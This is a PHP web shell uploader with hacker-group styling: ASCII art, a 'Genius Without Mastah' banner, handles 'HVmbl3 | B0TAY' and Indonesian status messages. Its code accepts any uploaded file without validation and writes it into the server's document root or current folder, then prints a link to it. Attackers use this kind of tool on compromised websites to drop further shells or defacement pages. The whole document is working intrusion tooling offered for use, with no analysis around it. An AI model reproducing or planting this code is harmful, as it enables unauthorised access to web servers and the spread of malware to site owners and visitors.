	<html>
	<head>
	<title>[ Aww ]></title>
	<link rel="SHORTCUT ICON" href="https://cdn.countryflags.com/thumbs/indonesia/flag-round-250.png" type="image/gif">
	<link href='https://fonts.googleapis.com/css?family=Contrail One' rel='stylesheet'>
	</head>
	<style>
	body{background-color:black;color:green;}
	h1{color:#00440e;font-family:"Courier New", Courier, monospace;}
	pre{color:green;font-size:20px;}
	label{color:white;}
	</style>
	<body>
	<center><header><pre>
 (()__(()
 /       \
 ( /    \  \
  \ o o    /
   (_()_)__/ \
   / _,==.____ \
   (   |--|      )
    /\_.|__|'-.__/\_
    / (        /     \
    \  \      (      /
    )  '._____)    /
                     (((____.--(((____/ HVmbl3 | B0TAY | You</pre></header>
	<h1><label>.:</label><marquee width="410" scrolldelay=60 behavior="alternate"  >Genius Without Mastah</marquee><label>:.</label></h1>
	<?php
echo "<form method='post' enctype='multipart/form-data'>
	  <input type='file' name='just_file'>
	  <input type='submit' name='upload' value='Submit'>
	  </form>";
$root = $_SERVER['DOCUMENT_ROOT'];
$files = $_FILES['just_file']['name'];
$dest = $root.'/'.$files;
if(isset($_POST['upload'])) {
	if(is_writable($root)) {
		if(@copy($_FILES['just_file']['tmp_name'], $dest)) {
			$web = "http://".$_SERVER['HTTP_HOST']."/";
			echo "[OK] <a href='$web$files' target='_blank' style='color:white;font-family:Courier New'><u>$web/$files</u></a>";
		} else {
			echo "gagal upload di document root.";
		}
	} else {
		if(@copy($_FILES['just_file']['tmp_name'], $files)) {
			echo " upload <b>$files</b> di folder ini";
		} else {
			echo "gagal upload";
		}
	}
}
?>
	</form>
	</center>
	</body>
	</html>
